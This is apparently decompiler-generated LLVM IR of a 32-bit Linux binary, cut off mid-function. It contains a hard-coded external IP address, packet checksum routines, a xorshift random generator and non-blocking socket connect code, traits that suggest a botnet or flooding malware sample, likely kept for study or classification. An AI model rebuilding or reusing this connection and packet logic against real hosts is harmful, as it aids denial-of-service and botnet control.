source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%tms = type { i32, i32, i32, i32 }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%stat = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32 }
%linux_dirent64 = type { i32 }

@df = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_805300c.2 = global i32 0
@global_var_8053024.3 = local_unnamed_addr global i32* @global_var_805300c.2
@global_var_80530d0.5 = local_unnamed_addr global i32 0
@global_var_80530dc.6 = local_unnamed_addr global i32 0
@global_var_80530d4.7 = local_unnamed_addr global i32 0
@global_var_80530d8.8 = local_unnamed_addr global i32 0
@global_var_8053130.9 = local_unnamed_addr global i32 0
@global_var_805310a.10 = local_unnamed_addr global i32 0
@global_var_8053110.11 = local_unnamed_addr global i32 0
@global_var_8053100.12 = global i32 0
@global_var_8053118.14 = local_unnamed_addr global i32 0
@global_var_8053124.15 = local_unnamed_addr global i32 0
@global_var_8053114.16 = global i32 0
@global_var_805317c.17 = local_unnamed_addr global i32 0
@global_var_8053104.18 = local_unnamed_addr global i32 0
@global_var_805315c.19 = local_unnamed_addr global i32 0
@global_var_805310c.20 = local_unnamed_addr global i32 0
@global_var_8053178.21 = local_unnamed_addr global i32 0
@global_var_8052659.22 = constant [3 x i8] c"\0D\0A\00"
@global_var_80530e0.24 = local_unnamed_addr global i32 0
@global_var_8053128.25 = local_unnamed_addr global i32 0
@global_var_80525e2.26 = constant [15 x i8] c"212.237.54.173\00"
@global_var_80531a0.27 = global i32 0
@global_var_8053154.29 = global i32 0
@global_var_80532c0.30 = global i32 0
@global_var_805303c.31 = global i32 0
@global_var_805336c.33 = global i32 0
@global_var_8053370.34 = local_unnamed_addr global i32 0
@global_var_8053374.35 = global i32 0
@global_var_8053380.36 = local_unnamed_addr global i32 0
@global_var_8053674.37 = global i32 0
@global_var_805369c.38 = local_unnamed_addr global i32 0
@global_var_805368c.39 = local_unnamed_addr global i32 0
@global_var_8053690.40 = local_unnamed_addr global i32 0
@global_var_8053694.41 = local_unnamed_addr global i32 0
@global_var_8053698.42 = local_unnamed_addr global i32 0
@global_var_80536a4.43 = local_unnamed_addr global i32 0
@global_var_80536b0.44 = local_unnamed_addr global i32 0
@global_var_80536a8.45 = local_unnamed_addr global i32 0
@global_var_80536b4.46 = local_unnamed_addr global i32 0
@global_var_8053688.47 = local_unnamed_addr global i32 0
@global_var_8053684.49 = local_unnamed_addr global i32 0
@global_var_80536ac.50 = local_unnamed_addr global i32 0
@global_var_805337c.51 = local_unnamed_addr global i32 0
@global_var_8053054.52 = global i32 0
@global_var_805306c.54 = global i32 0
@global_var_8053138.55 = local_unnamed_addr global i32 0
@global_var_8053000.57 = global i32 -1
@global_var_8051b7e.58 = constant i32 -294069
@global_var_8053148.59 = local_unnamed_addr global i32 0
@global_var_805314c.60 = local_unnamed_addr global i32 0
@global_var_8052a80.61 = constant [10 x i8] c"/dev/null\00"
@global_var_8053144.63 = local_unnamed_addr global i32 0
@global_var_805313c.64 = local_unnamed_addr global i32 0
@global_var_8053140.65 = local_unnamed_addr global i32 0
@global_var_8052ba0.67 = constant i32 33554944
@global_var_8051d64.68 = constant i32 1928542531
@global_var_8051d88.69 = constant i32 1928542531
@global_var_8053158.70 = local_unnamed_addr global i32 0
@global_var_8053088.71 = local_unnamed_addr global i32* @global_var_8052ba0.67
@global_var_80536b8.72 = local_unnamed_addr global i32 0
@global_var_80536bc.73 = local_unnamed_addr global i32 0
@global_var_80530a0.1 = local_unnamed_addr global i8 0
@global_var_8053116.13 = local_unnamed_addr global i16 0
@global_var_805312c.23 = local_unnamed_addr global i16 0
@global_var_8053038.28 = local_unnamed_addr global i16 -1105
@global_var_8053340.32 = global i8 0
@global_var_80536a0.48 = local_unnamed_addr global i8 0
@global_var_8053134.53 = local_unnamed_addr global i8 0
@global_var_8053150.62 = local_unnamed_addr global i8 0

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_8048094() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @function_80480b0(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 44919
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @function_8048110()
  %v0_80480a8 = call i32 @function_80525a0()
  ret i32 %v0_80480a8
}

define i32 @function_80480b0(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @function_80480c0() local_unnamed_addr {
dec_label_pc_80480c0:
  %v0_80480c6 = load i8, i8* @global_var_80530a0.1, align 32
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge

dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge: ; preds = %dec_label_pc_80480c0
  %v0_8048107.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048106

dec_label_pc_80480db.preheader:                   ; preds = %dec_label_pc_80480c0
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_8053024.3 to i32*), align 4
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e44 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e44, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_8053024.3 to i32*), align 4
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_8053024.3 to i32*), align 4
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_80530a0.1, align 32
  br label %dec_label_pc_8048106

dec_label_pc_8048106:                             ; preds = %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge, %dec_label_pc_80480e6
  %v0_8048107 = phi i32 [ %v0_8048107.pre, %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048107

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_8053024.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_80530a0.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048106, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @function_8048110() local_unnamed_addr {
dec_label_pc_8048110:
  store i32 0, i32* @eax, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_8048140, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048138 = call i32 @unknown_0(i32 134557088)
  br label %dec_label_pc_8048140

dec_label_pc_8048140:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_8048140, { 1, 0 }
}

define i32 @entry_point(i8 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %v3_8048166 = sext i8 %arg1 to i32
  store i32 %v3_8048166, i32* @esi, align 4
  %v5_8048166 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v5_8048166, i32* @ecx, align 4
  %v0_804816c = load i32, i32* @eax, align 4
  store i32 %v0_804816c, i32* %stack_var_-4, align 4
  %v4_804816c = ptrtoint i32* %stack_var_-4 to i32
  %v0_804816e = load i32, i32* @edx, align 4
  %v11_8048180 = call i32 @function_8051c1a(i32 134532832, i32 %v3_8048166, i32* nonnull %stack_var_4, i32 -108, i32 134555078, i32 %v0_804816e, i32 %v4_804816c, i32 %v0_804816c)
  %v4_80481a19 = zext i8 %arg1 to i32
  %v2_80481a5 = icmp eq i8 %arg1, 0
  br i1 %v2_80481a5, label %dec_label_pc_80481d3, label %dec_label_pc_80481b0

dec_label_pc_80481b0:                             ; preds = %entry
  %v3_80481b4 = add i32 %v5_8048166, 4
  %v4_80481b4 = inttoptr i32 %v3_80481b4 to i8*
  %v5_80481b4 = load i8, i8* %v4_80481b4, align 4
  %v16_80481b4 = icmp eq i8 %v5_80481b4, -108
  br i1 %v16_80481b4, label %dec_label_pc_80481db, label %dec_label_pc_80481b9

dec_label_pc_80481b9:                             ; preds = %dec_label_pc_80481b0
  br label %dec_label_pc_80481ce

dec_label_pc_80481c0:                             ; preds = %dec_label_pc_80481ce
  %v1_80481c0 = add i32 %v0_80481c3.in, 12
  %v2_80481c0 = inttoptr i32 %v1_80481c0 to i8*
  %v3_80481c0 = load i8, i8* %v2_80481c0, align 4
  %v4_80481c0 = zext i8 %v3_80481c0 to i32
  %v6_80481c0 = and i32 %v5_80481c0, -256
  %v7_80481c0 = or i32 %v4_80481c0, %v6_80481c0
  %v16_80481c8 = icmp eq i8 %v3_80481c0, -108
  br i1 %v16_80481c8, label %dec_label_pc_80481db, label %dec_label_pc_80481ce

dec_label_pc_80481ce:                             ; preds = %dec_label_pc_80481c0, %dec_label_pc_80481b9
  %v5_80481c0 = phi i32 [ %v7_80481c0, %dec_label_pc_80481c0 ], [ 148, %dec_label_pc_80481b9 ]
  %v0_80481c3.in = phi i32 [ %v0_80481c3, %dec_label_pc_80481c0 ], [ %v5_8048166, %dec_label_pc_80481b9 ]
  %v0_80481ce = phi i32 [ %v1_80481ce, %dec_label_pc_80481c0 ], [ 0, %dec_label_pc_80481b9 ]
  %v0_80481c3 = add i32 %v0_80481c3.in, 8
  %v1_80481ce = add i32 %v0_80481ce, 1
  %v12_80481cf = icmp eq i32 %v1_80481ce, %v4_80481a19
  %v1_80481d1 = icmp eq i1 %v12_80481cf, false
  br i1 %v1_80481d1, label %dec_label_pc_80481c0, label %dec_label_pc_80481d3

dec_label_pc_80481d3:                             ; preds = %dec_label_pc_80481ce, %entry
  ret i32 134555078

dec_label_pc_80481db:                             ; preds = %dec_label_pc_80481c0, %dec_label_pc_80481b0
  %v0_80481db = phi i32 [ %v5_8048166, %dec_label_pc_80481b0 ], [ %v0_80481c3, %dec_label_pc_80481c0 ]
  %v1_80481db = inttoptr i32 %v0_80481db to i32*
  %v2_80481db = load i32, i32* %v1_80481db, align 4
  ret i32 %v2_80481db

; uselistorder directives
  uselistorder i32 %v0_80481c3.in, { 1, 0 }
  uselistorder i32 %v5_8048166, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8 %arg1, { 1, 0, 2 }
}

define i32 @function_804bd90() local_unnamed_addr {
dec_label_pc_804bd90:
  %tmp = call i16* @__decompiler_undefined_function_2()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %v4_804bd97 = ptrtoint i16* %tmp to i32
  %tmp14 = or i32 %tmp11, 1
  %tmp15 = icmp eq i32 %tmp14, 1
  br i1 %tmp15, label %dec_label_pc_804bdb5, label %dec_label_pc_804bda0

dec_label_pc_804bda0:                             ; preds = %dec_label_pc_804bd90, %dec_label_pc_804bda0
  %v0_804bdae = phi i32 [ %v2_804bdae, %dec_label_pc_804bda0 ], [ 0, %dec_label_pc_804bd90 ]
  %v0_804bda3 = phi i32 [ %v1_804bda3, %dec_label_pc_804bda0 ], [ %tmp11, %dec_label_pc_804bd90 ]
  %v0_804bdab = phi i32 [ %v1_804bdab, %dec_label_pc_804bda0 ], [ %v4_804bd97, %dec_label_pc_804bd90 ]
  %v1_804bda0 = inttoptr i32 %v0_804bdab to i16*
  %v2_804bda0 = load i16, i16* %v1_804bda0, align 2
  %v3_804bda0 = zext i16 %v2_804bda0 to i32
  %v1_804bda3 = add i32 %v0_804bda3, -2
  %v1_804bdab = add i32 %v0_804bdab, 2
  %v2_804bdae = add i32 %v3_804bda0, %v0_804bdae
  %v5_804bdb0 = icmp eq i32 %v1_804bda3, 0
  %v9_804bdb0 = icmp eq i32 %v0_804bda3, 3
  %v2_804bdb3 = or i1 %v9_804bdb0, %v5_804bdb0
  br i1 %v2_804bdb3, label %dec_label_pc_804bdb5, label %dec_label_pc_804bda0

dec_label_pc_804bdb5:                             ; preds = %dec_label_pc_804bda0, %dec_label_pc_804bd90
  %v0_804bdbb = phi i32 [ 0, %dec_label_pc_804bd90 ], [ %v2_804bdae, %dec_label_pc_804bda0 ]
  %v0_804bdb8 = phi i32 [ %v4_804bd97, %dec_label_pc_804bd90 ], [ %v1_804bdab, %dec_label_pc_804bda0 ]
  %v0_804bdb5 = phi i32 [ %tmp11, %dec_label_pc_804bd90 ], [ %v1_804bda3, %dec_label_pc_804bda0 ]
  %v8_804bdb5 = icmp eq i32 %v0_804bdb5, 1
  %v1_804bdb6 = icmp eq i1 %v8_804bdb5, false
  br i1 %v1_804bdb6, label %dec_label_pc_804bdbd, label %dec_label_pc_804bdb8

dec_label_pc_804bdb8:                             ; preds = %dec_label_pc_804bdb5
  %v1_804bdb8 = inttoptr i32 %v0_804bdb8 to i8*
  %v2_804bdb8 = load i8, i8* %v1_804bdb8, align 1
  %v3_804bdb8 = sext i8 %v2_804bdb8 to i32
  %v2_804bdbb = add i32 %v3_804bdb8, %v0_804bdbb
  br label %dec_label_pc_804bdbd

dec_label_pc_804bdbd:                             ; preds = %dec_label_pc_804bdb5, %dec_label_pc_804bdb8
  %v0_804bdbd = phi i32 [ %v0_804bdbb, %dec_label_pc_804bdb5 ], [ %v2_804bdbb, %dec_label_pc_804bdb8 ]
  %v1_804bdbf = urem i32 %v0_804bdbd, 65536
  %v2_804bdc2 = udiv i32 %v0_804bdbd, 65536
  %v2_804bdc6 = add nuw nsw i32 %v1_804bdbf, %v2_804bdc2
  %v2_804bdca = udiv i32 %v2_804bdc6, 65536
  %v2_804bdcd = add nuw nsw i32 %v2_804bdca, %v2_804bdc6
  %v1_804bdcf = urem i32 %v2_804bdcd, 65536
  %v1_804bdd2 = xor i32 %v1_804bdcf, 65535
  ret i32 %v1_804bdd2

; uselistorder directives
  uselistorder i32 %v2_804bdc6, { 1, 0 }
  uselistorder i32 %v0_804bdbb, { 1, 0 }
  uselistorder i32 %v1_804bda3, { 0, 2, 1 }
  uselistorder i32 %v4_804bd97, { 1, 0 }
  uselistorder i32 %tmp11, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804bdbd, { 1, 0 }
  uselistorder label %dec_label_pc_804bda0, { 1, 0 }
}

define i32 @function_804bde0() local_unnamed_addr {
dec_label_pc_804bde0:
  %tmp14 = call i16* @__decompiler_undefined_function_2()
  %tmp15 = call i16 @__decompiler_undefined_function_3()
  %tmp16 = call i32 @__decompiler_undefined_function_0()
  %tmp17 = call i32 @__decompiler_undefined_function_0()
  %v4_804bdf5 = ptrtoint i16* %tmp14 to i32
  %v1_804bdfe = add i32 %tmp17, 12
  %v2_804bdfe = inttoptr i32 %v1_804bdfe to i32*
  %v3_804bdfe = load i32, i32* %v2_804bdfe, align 4
  %v1_804be01 = add i32 %tmp17, 16
  %v2_804be01 = inttoptr i32 %v1_804be01 to i32*
  %v3_804be01 = load i32, i32* %v2_804be01, align 4
  %v7_804be07 = icmp sgt i32 %tmp16, 1
  br i1 %v7_804be07, label %dec_label_pc_804be10, label %dec_label_pc_804be25

dec_label_pc_804be10:                             ; preds = %dec_label_pc_804bde0, %dec_label_pc_804be10
  %v0_804be1e = phi i32 [ %v2_804be1e, %dec_label_pc_804be10 ], [ 0, %dec_label_pc_804bde0 ]
  %v0_804be13 = phi i32 [ %v1_804be13, %dec_label_pc_804be10 ], [ %tmp16, %dec_label_pc_804bde0 ]
  %v0_804be1b = phi i32 [ %v1_804be1b, %dec_label_pc_804be10 ], [ %v4_804bdf5, %dec_label_pc_804bde0 ]
  %v1_804be10 = inttoptr i32 %v0_804be1b to i16*
  %v2_804be10 = load i16, i16* %v1_804be10, align 2
  %v3_804be10 = zext i16 %v2_804be10 to i32
  %v1_804be13 = add i32 %v0_804be13, -2
  %v1_804be1b = add i32 %v0_804be1b, 2
  %v2_804be1e = add i32 %v3_804be10, %v0_804be1e
  %v1_804be20 = add i32 %v0_804be13, -3
  %v6_804be20 = sub i32 2, %v0_804be13
  %v7_804be20 = and i32 %v1_804be13, %v6_804be20
  %v8_804be20 = icmp slt i32 %v7_804be20, 0
  %v9_804be20 = icmp eq i32 %v1_804be20, 0
  %v10_804be20 = icmp slt i32 %v1_804be20, 0
  %v3_804be23 = icmp eq i1 %v10_804be20, %v8_804be20
  %v4_804be23 = icmp eq i1 %v9_804be20, false
  %v5_804be23 = and i1 %v4_804be23, %v3_804be23
  br i1 %v5_804be23, label %dec_label_pc_804be10, label %dec_label_pc_804be25

dec_label_pc_804be25:                             ; preds = %dec_label_pc_804be10, %dec_label_pc_804bde0
  %v0_804be90 = phi i32 [ 0, %dec_label_pc_804bde0 ], [ %v2_804be1e, %dec_label_pc_804be10 ]
  %v0_804be8e = phi i32 [ %v4_804bdf5, %dec_label_pc_804bde0 ], [ %v1_804be1b, %dec_label_pc_804be10 ]
  %v0_804be25 = phi i32 [ %tmp16, %dec_label_pc_804bde0 ], [ %v1_804be13, %dec_label_pc_804be10 ]
  %v8_804be25 = icmp eq i32 %v0_804be25, 1
  br i1 %v8_804be25, label %dec_label_pc_804be8c, label %dec_label_pc_804be28

dec_label_pc_804be28:                             ; preds = %dec_label_pc_804be25, %dec_label_pc_804be8c
  %v0_804be36 = phi i32 [ %v0_804be90, %dec_label_pc_804be25 ], [ %v2_804be90, %dec_label_pc_804be8c ]
  %v2_804be2c = udiv i32 %v3_804be01, 65536
  %v1_804be2f = add i32 %tmp17, 9
  %v2_804be2f = inttoptr i32 %v1_804be2f to i8*
  %v3_804be2f = load i8, i8* %v2_804be2f, align 1
  %v1_804be32 = zext i8 %v3_804be2f to i16
  %v2_804be32 = call i16 @llvm.bswap.i16(i16 %v1_804be32)
  %v3_804be32 = zext i16 %v2_804be32 to i32
  %v2_804be36 = add i32 %v0_804be36, %v2_804be2c
  %v2_804be3e = add i32 %v2_804be36, %v3_804be32
  %v1_804be44 = urem i32 %v3_804bdfe, 65536
  %v2_804be4a = udiv i32 %v3_804bdfe, 65536
  %v1_804be51 = urem i32 %v3_804be01, 65536
  %v4_804be59 = zext i16 %tmp15 to i32
  %v2_804be4d = add nuw nsw i32 %v2_804be4a, %v4_804be59
  %v2_804be57 = add nuw nsw i32 %v2_804be4d, %v1_804be44
  %v2_804be64 = add nuw nsw i32 %v2_804be57, %v1_804be51
  %v2_804be66 = add i32 %v2_804be64, %v2_804be3e
  %tmp = icmp ult i32 %v2_804be66, 65536
  br i1 %tmp, label %dec_label_pc_804be7e, label %dec_label_pc_804be70

dec_label_pc_804be70:                             ; preds = %dec_label_pc_804be28, %dec_label_pc_804be70
  %v2_804be753 = phi i32 [ %v2_804be75, %dec_label_pc_804be70 ], [ %v2_804be66, %dec_label_pc_804be28 ]
  %v2_804be794.in = phi i32 [ %v2_804be75, %dec_label_pc_804be70 ], [ %v2_804be66, %dec_label_pc_804be28 ]
  %v2_804be794 = udiv i32 %v2_804be794.in, 65536
  %v1_804be70 = urem i32 %v2_804be753, 65536
  %v2_804be75 = add nuw nsw i32 %v1_804be70, %v2_804be794
  %tmp25 = icmp ult i32 %v2_804be75, 65536
  %v1_804be7c = icmp eq i1 %tmp25, false
  br i1 %v1_804be7c, label %dec_label_pc_804be70, label %dec_label_pc_804be7e.loopexit

dec_label_pc_804be7e.loopexit:                    ; preds = %dec_label_pc_804be70
  br label %dec_label_pc_804be7e

dec_label_pc_804be7e:                             ; preds = %dec_label_pc_804be7e.loopexit, %dec_label_pc_804be28
  %v0_804be7e = phi i32 [ %v2_804be75, %dec_label_pc_804be7e.loopexit ], [ %v2_804be66, %dec_label_pc_804be28 ]
  %v1_804be7e = urem i32 %v0_804be7e, 65536
  %v1_804be82 = xor i32 %v1_804be7e, 65535
  ret i32 %v1_804be82

dec_label_pc_804be8c:                             ; preds = %dec_label_pc_804be25
  %v1_804be8e = inttoptr i32 %v0_804be8e to i8*
  %v2_804be8e = load i8, i8* %v1_804be8e, align 1
  %v3_804be8e = zext i8 %v2_804be8e to i32
  %v2_804be90 = add i32 %v3_804be8e, %v0_804be90
  br label %dec_label_pc_804be28

; uselistorder directives
  uselistorder i32 %v2_804be75, { 2, 1, 3, 0 }
  uselistorder i32 %v2_804be66, { 3, 0, 2, 1 }
  uselistorder i32 %v1_804be20, { 1, 0 }
  uselistorder i32 %v1_804be13, { 0, 2, 1 }
  uselistorder i32 %v3_804be01, { 1, 0 }
  uselistorder i32 %v4_804bdf5, { 1, 0 }
  uselistorder i32 %tmp17, { 0, 2, 1 }
  uselistorder i32 %tmp16, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804be70, { 1, 0 }
  uselistorder label %dec_label_pc_804be28, { 1, 0 }
  uselistorder label %dec_label_pc_804be10, { 1, 0 }
}

define i32 @function_804d6c0() local_unnamed_addr {
dec_label_pc_804d6c0:
  %v0_804d6c0 = load i32, i32* @global_var_80530d0.5, align 16
  %v0_804d6c8 = load i32, i32* @global_var_80530dc.6, align 4
  %v2_804d6ce = mul i32 %v0_804d6c0, 2048
  %v2_804d6d3 = udiv i32 %v0_804d6c8, 524288
  store i32 %v2_804d6d3, i32* @ecx, align 4
  %v2_804d6d6 = xor i32 %v2_804d6ce, %v0_804d6c0
  %v0_804d6d8 = load i32, i32* @global_var_80530d4.7, align 4
  store i32 %v0_804d6d8, i32* @global_var_80530d0.5, align 16
  %v0_804d6e2 = load i32, i32* @global_var_80530d8.8, align 8
  store i32 %v0_804d6e2, i32* @global_var_80530d4.7, align 4
  store i32 %v0_804d6c8, i32* @global_var_80530d8.8, align 8
  %v2_804d6f4 = xor i32 %v2_804d6d3, %v0_804d6c8
  %v2_804d6f6 = udiv i32 %v2_804d6d6, 256
  %v2_804d6f9 = xor i32 %v2_804d6f6, %v2_804d6d6
  %v2_804d6fb = xor i32 %v2_804d6f9, %v2_804d6f4
  store i32 %v2_804d6fb, i32* @global_var_80530dc.6, align 4
  ret i32 %v2_804d6fb

; uselistorder directives
  uselistorder i32 %v2_804d6d6, { 1, 0 }
  uselistorder i32 %v2_804d6d3, { 1, 0 }
  uselistorder i32 %v0_804d6c8, { 1, 2, 0 }
  uselistorder i32 %v0_804d6c0, { 1, 0 }
}

define i32 @function_804d8f0() local_unnamed_addr {
dec_label_pc_804d8f0:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_804d8f0 = load i32, i32* @ebx, align 4
  %v0_804d8f1 = load i32, i32* @eax, align 4
  store i32 %v0_804d8f1, i32* @ebx, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_804d916 = add i32 %v0_804d8f1, 4
  %v2_804d916 = inttoptr i32 %v1_804d916 to i32*
  %v3_804d916 = load i32, i32* %v2_804d916, align 4
  %v10_804d919 = icmp eq i32 %v3_804d916, -1
  br i1 %v10_804d919, label %dec_label_pc_804d8f0.dec_label_pc_804d92a_crit_edge, label %dec_label_pc_804d91e

dec_label_pc_804d8f0.dec_label_pc_804d92a_crit_edge: ; preds = %dec_label_pc_804d8f0
  br label %dec_label_pc_804d92a

dec_label_pc_804d91e:                             ; preds = %dec_label_pc_804d8f0
  %v1_804d922 = call i32 @function_804fce3(i32 %v3_804d916)
  br label %dec_label_pc_804d92a

dec_label_pc_804d92a:                             ; preds = %dec_label_pc_804d8f0.dec_label_pc_804d92a_crit_edge, %dec_label_pc_804d91e
  %v0_804d92a = phi i32 [ -1, %dec_label_pc_804d8f0.dec_label_pc_804d92a_crit_edge ], [ %v1_804d922, %dec_label_pc_804d91e ]
  store i32 %v0_804d92a, i32* %stack_var_-32, align 4
  %v4_804d931 = call i32 @function_80504f2(i32 2, i32 1, i32 0, i32 %v0_804d92a)
  %v1_804d939 = load i32, i32* @ebx, align 4
  %v2_804d939 = add i32 %v1_804d939, 4
  %v3_804d939 = inttoptr i32 %v2_804d939 to i32*
  store i32 %v4_804d931, i32* %v3_804d939, align 4
  %v1_804d93c = add i32 %v4_804d931, 1
  %v8_804d93c = icmp eq i32 %v1_804d93c, 0
  br i1 %v8_804d93c, label %dec_label_pc_804d9b3, label %dec_label_pc_804d93f

dec_label_pc_804d93f:                             ; preds = %dec_label_pc_804d92a
  store i32 %v1_804d93c, i32* %stack_var_-32, align 4
  %v0_804d941 = load i32, i32* @ebx, align 4
  %v1_804d941 = add i32 %v0_804d941, 28
  store i32 %v1_804d941, i32* @eax, align 4
  %v1_804d949 = add i32 %v0_804d941, 24
  %v2_804d949 = inttoptr i32 %v1_804d949 to i32*
  store i32 0, i32* %v2_804d949, align 4
  %v0_804d950 = load i32, i32* @eax, align 4
  %v3_804d951 = load i32, i32* %stack_var_-32, align 4
  %v4_804d951 = call i32 @function_804f850(i32 %v0_804d950, i32 256, i32 %v1_804d93c, i32 %v3_804d951)
  %v0_804d959 = load i32, i32* @ebx, align 4
  %v1_804d959 = add i32 %v0_804d959, 4
  %v2_804d959 = inttoptr i32 %v1_804d959 to i32*
  %v3_804d959 = load i32, i32* %v2_804d959, align 4
  %v3_804d961 = call i32 @function_804fc4d(i32 %v3_804d959, i32 3, i32 0)
  %v0_804d969 = load i32, i32* @ebx, align 4
  %v1_804d969 = add i32 %v0_804d969, 4
  %v2_804d969 = inttoptr i32 %v1_804d969 to i32*
  %v3_804d969 = load i32, i32* %v2_804d969, align 4
  %v12_804d96c = or i32 %v3_804d961, 2048
  %v3_804d973 = call i32 @function_804fc4d(i32 %v3_804d969, i32 4, i32 %v12_804d96c)
  %v0_804d978 = load i32, i32* @ebx, align 4
  store i32 2, i32* %stack_var_-20, align 4
  %v0_804d98e = load i32, i32* @global_var_8053130.9, align 16
  %v2_804d993 = add i32 %v0_804d978, 8
  %v3_804d993 = inttoptr i32 %v2_804d993 to i32*
  store i32 %v0_804d98e, i32* %v3_804d993, align 4
  %v2_804d996 = ptrtoint i32* %stack_var_-20 to i32
  %v0_804d99d = load i32, i32* @ebx, align 4
  %v1_804d99d = add i32 %v0_804d99d, 4
  %v2_804d99d = inttoptr i32 %v1_804d99d to i32*
  %v3_804d99d = load i32, i32* %v2_804d99d, align 4
  store i32 %v3_804d99d, i32* %edx.global-to-local, align 4
  %v1_804d9a0 = add i32 %v0_804d99d, 12
  %v2_804d9a0 = inttoptr i32 %v1_804d9a0 to i32*
  store i32 1, i32* %v2_804d9a0, align 4
  %v0_804d9aa = load i32, i32* %edx.global-to-local, align 4
  %v3_804d9ab = call i32 @function_8050317(i32 %v0_804d9aa, i32 %v2_804d996, i32 16)
  br label %dec_label_pc_804d9b3

dec_label_pc_804d9b3:                             ; preds = %dec_label_pc_804d92a, %dec_label_pc_804d93f
  %v0_804d9b7 = phi i32 [ %v3_804d9ab, %dec_label_pc_804d93f ], [ 0, %dec_label_pc_804d92a ]
  store i32 %v0_804d8f0, i32* @ebx, align 4
  ret i32 %v0_804d9b7

; uselistorder directives
  uselistorder i32 %v3_804d916, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d9b3, { 1, 0 }
  uselistorder label %dec_label_pc_804d92a, { 1, 0 }
}

define i32 @function_804dddd() local_unnamed_addr {
dec_label_pc_804dddd:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_804e3c2, %dec_label_pc_804dddd
  %v0_804dddd = load i32, i32* @global_var_8053130.9, align 16
  store i32 %v0_804dddd, i32* @esi, align 4
  %v0_804dde3 = load i32, i32* @esp, align 4
  %v1_804dde3 = add i32 %v0_804dde3, 16
  %v2_804dde3 = inttoptr i32 %v1_804dde3 to i32*
  %v3_804dde3 = load i32, i32* %v2_804dde3, align 4
